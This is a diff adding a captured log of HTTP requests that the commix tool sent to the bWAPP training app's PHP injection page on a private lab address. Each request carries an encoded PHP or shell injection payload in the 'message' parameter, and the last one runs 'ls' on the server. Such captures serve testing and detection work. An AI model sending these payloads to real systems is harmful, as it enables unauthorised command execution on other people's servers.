@@ -1,0 +1,418 @@
+GET /bWAPP/phpi.php?message=test%3Becho%20%24%28%281809%2B4100%29%29%2526%2526echo%20%24%28%281809%2B4100%29%29%7C%7Cecho%20%24%28%281809%2B4100%29%29 HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test%7Cset%20/a%20%281809%2B4100%29%26set%20/a%20%281809%2B4100%29 HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print%28phpinfo%28%29%29 HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20FDQJDK`.`echo%20$((88%2B54))`.`echo%20FDQJDK`.`echo%20FDQJDK`)}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20AGHUNX%0aecho%20$((56%2B67))%0aecho%20AGHUNX%0aecho%20AGHUNX`)%3B}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20SXVCLU%0d%0aecho%20$((89%2B16))%0d%0aecho%20SXVCLU%0d%0aecho%20SXVCLU`)%3B}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20WNVNIT`.`echo%20$((89%2B93))`.`echo%20WNVNIT`.`echo%20WNVNIT`).' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20FWRPUY%0aecho%20$((94%2B22))%0aecho%20FWRPUY%0aecho%20FWRPUY`)%3B.' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20PPDCIR%0d%0aecho%20$((61%2B60))%0d%0aecho%20PPDCIR%0d%0aecho%20PPDCIR`)%3B.' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20ACQWHX`.`echo%20$((98%2B35))`.`echo%20ACQWHX`.`echo%20ACQWHX`)' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20DADOBZ%0aecho%20$((75%2B83))%0aecho%20DADOBZ%0aecho%20DADOBZ`)%3B' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20CHFTXE%0d%0aecho%20$((51%2B74))%0d%0aecho%20CHFTXE%0d%0aecho%20CHFTXE`)%3B' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20YUQMEW`.`echo%20$((73%2B9))`.`echo%20YUQMEW`.`echo%20YUQMEW`) HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20GMAYNA%0aecho%20$((49%2B89))%0aecho%20GMAYNA%0aecho%20GMAYNA`)%3B HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test{${print(`echo%20FNSBPL%0d%0aecho%20$((79%2B47))%0d%0aecho%20FNSBPL%0d%0aecho%20FNSBPL`)%3B HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20GOCCEA`.`echo%20$((30%2B91))`.`echo%20GOCCEA`.`echo%20GOCCEA`)}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20WQVLCE%0aecho%20$((39%2B75))%0aecho%20WQVLCE%0aecho%20WQVLCE`)%3B}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20FZQQSF%0d%0aecho%20$((82%2B5))%0d%0aecho%20FZQQSF%0d%0aecho%20FZQQSF`)%3B}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20FWHGBR`.`echo%20$((40%2B18))`.`echo%20FWHGBR`.`echo%20FWHGBR`).' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20UWYCON%0aecho%20$((99%2B41))%0aecho%20UWYCON%0aecho%20UWYCON`)%3B.' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20TNOTAF%0d%0aecho%20$((62%2B57))%0d%0aecho%20TNOTAF%0d%0aecho%20TNOTAF`)%3B.' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20VJRCUN`.`echo%20$((80%2B72))`.`echo%20VJRCUN`.`echo%20VJRCUN`)' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20NWJZAN%0aecho%20$((5%2B47))%0aecho%20NWJZAN%0aecho%20NWJZAN`)%3B' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20HGKAQP%0d%0aecho%20$((88%2B12))%0d%0aecho%20HGKAQP%0d%0aecho%20HGKAQP`)%3B' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20LYGLPU`.`echo%20$((52%2B90))`.`echo%20LYGLPU`.`echo%20LYGLPU`) HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20TGBWYU%0aecho%20$((86%2B94))%0aecho%20TGBWYU%0aecho%20TGBWYU`)%3B HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test'.print(`echo%20ZCKSFN%0d%0aecho%20$((74%2B72))%0d%0aecho%20ZCKSFN%0d%0aecho%20ZCKSFN`)%3B HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20YALTBJ`.`echo%20$((33%2B13))`.`echo%20YALTBJ`.`echo%20YALTBJ`)}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20MBVLBI%0aecho%20$((48%2B49))%0aecho%20MBVLBI%0aecho%20MBVLBI`)%3B}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20VBMMAI%0d%0aecho%20$((59%2B92))%0d%0aecho%20VBMMAI%0d%0aecho%20VBMMAI`)%3B}} HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20ONNVCC`.`echo%20$((85%2B22))`.`echo%20ONNVCC`.`echo%20ONNVCC`).' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20ZEHPQW%0aecho%20$((59%2B61))%0aecho%20ZEHPQW%0aecho%20ZEHPQW`)%3B.' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20XMXQCR%0d%0aecho%20$((9%2B72))%0d%0aecho%20XMXQCR%0d%0aecho%20XMXQCR`)%3B.' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20GGVXKL`.`echo%20$((11%2B31))`.`echo%20GGVXKL`.`echo%20GGVXKL`)' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20XDWULZ%0aecho%20$((21%2B60))%0aecho%20XDWULZ%0aecho%20XDWULZ`)%3B' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20ZUXXUM%0d%0aecho%20$((98%2B71))%0d%0aecho%20ZUXXUM%0d%0aecho%20ZUXXUM`)%3B' HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20VDMLLB`.`echo%20$((83%2B57))`.`echo%20VDMLLB`.`echo%20VDMLLB`) HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
+GET /bWAPP/phpi.php?message=test.print(`echo%20VDMLLB`.`echo%20VDMLLB`.`ls`.`echo%20VDMLLB`.`echo%20VDMLLB`) HTTP/1.1
+Host: 192.168.6.129
+Cookie: security_level=0;PHPSESSID=g12o31obn43t9mqcfotg6tdo22
+User-Agent: commix/v3.5-stable (https://commixproject.com)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+
+========
+
